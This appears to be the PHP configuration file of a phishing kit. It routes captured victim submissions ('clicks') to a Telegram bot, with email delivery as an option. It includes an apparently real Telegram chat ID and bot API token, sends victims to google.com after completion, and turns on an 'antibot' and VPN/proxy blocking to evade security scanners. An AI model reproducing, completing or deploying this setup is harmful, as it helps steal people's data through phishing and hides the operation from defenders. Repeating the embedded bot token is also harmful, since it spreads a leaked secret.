<?php


$settings = array(
	// DELIVERY SETTINGS
	"send_clicks"   => "1", // Send Click To Your TG
	"send_mail"		=> "0", // Send E-Mail To Your Mail
	"telegram"		=> "1", // Telegram Bots Receiver

	// PAGE SETTINGS
	"redirect_url"  => "https://www.google.com/", // URL to redirect to after completion

	// EMAIL CONFIG
	"email"			=> "your@email.com", // Your E-Mail

	// TELEGRAM CONFIG
	"chat_id"		=> "6201590412", // Chat ID Of You
	"bot_url"		=> "6733452065:AAEhvIkG_mQ6csfT4407H_tkmjUqCZDt5B0", // Your Bot API Key 

	// LOADING PAGE SETTINGS
	"loading_timeout" => 180000, // Timeout in seconds for the loading page
	"loading_check_interval" => 100, // How often to check for redirect (in milliseconds)

	// REDIRECT DELAY SETTINGS
	"redirect_delay" => 1, // MINUTES

	// Add to settings array
	"debug_mode" => false, // Enable for local testing
);

return $settings;

// use antibot? yes|no
$antibot = "yes";

// want to block all VPNs/PROXIES? yes|no
$block_proxy = "yes";




?>
